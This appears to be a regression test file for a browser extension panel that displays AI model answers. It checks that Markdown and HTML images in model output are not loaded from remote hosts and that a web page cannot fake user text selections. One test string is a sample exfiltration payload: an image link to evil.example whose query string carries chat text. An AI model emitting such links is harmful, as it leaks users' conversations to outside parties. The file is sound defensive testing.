// What a web page or a model's answer must not be able to do through the panel.
// Part of tests/regression-checks.mjs. Mostly static; the Markdown renderer and page-watch.js
// run in a vm with just enough of a browser around them.
import assert from "node:assert/strict";
import vm from "node:vm";
import { functionSource, read, sidebarJs } from "../helpers/sources.mjs";

// ===================== MODEL OUTPUT NEVER LOADS A REMOTE IMAGE =====================
{
  const context = vm.createContext({});
  vm.runInContext(read("vendor/marked.umd.js"), context);
  vm.runInContext(`
    let markdownRendererCache;
    function escapeHtml(text) { return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
    ${functionSource(sidebarJs, "getMarkdownRenderer")}
    ${functionSource(sidebarJs, "formatResponseText")}`, context);
  const render = (text) => vm.runInContext(`formatResponseText(${JSON.stringify(text)})`, context);

  const leak = render("Done! ![loading](https://evil.example/pixel.png?chat=secret%20text)");
  assert.equal(/<img/i.test(leak), false, "a Markdown image from the model is not turned into <img>");
  assert.match(leak, /image not loaded: loading/, "the user sees that an image was left out");
  assert.equal(/<img/i.test(render('<img src="https://evil.example/x.png">')), false, "raw HTML images stay text");
  assert.match(render("**bold** and [a link](https://example.com)"), /<strong>bold<\/strong>[\s\S]*<a href="https:\/\/example\.com"/,
    "normal Markdown still renders");
}
{
  const policy = JSON.parse(read("manifest.json")).content_security_policy?.extension_pages ?? "";
  assert.match(policy, /img-src 'self' data: blob:(;|$)/, "the panel may show only its own and in-memory images");
  assert.match(policy, /script-src 'self'/, "the policy keeps MV3's script rule");
}

// ===================== A PAGE CAN'T FAKE A TEXT SELECTION =====================
// Runs page-watch.js with a fake page. `selection` is what window.getSelection() returns.
function watchPage({ selectedText = "picked text", rect = { width: 50, height: 10, top: 10, left: 10, bottom: 20, right: 60 } } = {}) {
  const listeners = {};
  const sent = [];
  const selection = {
    toString: () => selectedText,
    rangeCount: selectedText ? 1 : 0,
    getRangeAt: () => ({ getBoundingClientRect: () => rect }),
  };
  const window = { getSelection: () => selection, innerWidth: 1000, innerHeight: 800 };
  vm.runInNewContext(read("page-watch.js"), {
    window,
    document: { addEventListener: (type, handler) => { listeners[type] = handler; }, removeEventListener() { } },
    chrome: { runtime: { sendMessage: (message) => { sent.push(message); return Promise.resolve(); } } },
    setTimeout: (fn) => fn(), clearTimeout() { },
  });
  const fire = (type, event = {}) => listeners[type]({ isTrusted: true, ...event });
  return { fire, sent, selections: () => sent.filter((m) => m.type === "PAGE_TEXT_SELECTED") };
}
{
  const page = watchPage();
  page.fire("mousedown");
  page.fire("mouseup");
  assert.deepEqual(page.selections().map((m) => m.text), ["picked text"], "a real drag-select is reported");
}
{
  const page = watchPage();
  page.fire("mousedown", { isTrusted: false });
  page.fire("mouseup", { isTrusted: false });
  page.fire("keyup", { isTrusted: false, key: "Shift", shiftKey: true });
  assert.equal(page.selections().length, 0, "events the page made up are ignored");
}
{
  const page = watchPage();
  page.fire("mouseup"); // a real click, but the selection was made by the page's script
  assert.equal(page.selections().length, 0, "a release without the user's own press is ignored");
}
{
  const page = watchPage({ rect: { width: 50, height: 10, top: -5000, left: 10, bottom: -4990, right: 60 } });
  page.fire("mousedown");
  page.fire("mouseup");
  assert.equal(page.selections().length, 0, "text selected off-screen, where the user can't see it, is ignored");
}
{
  const page = watchPage();
  page.fire("keyup", { key: "Shift", shiftKey: true });
  assert.equal(page.selections().length, 1, "a real Shift+arrow selection is reported");
}
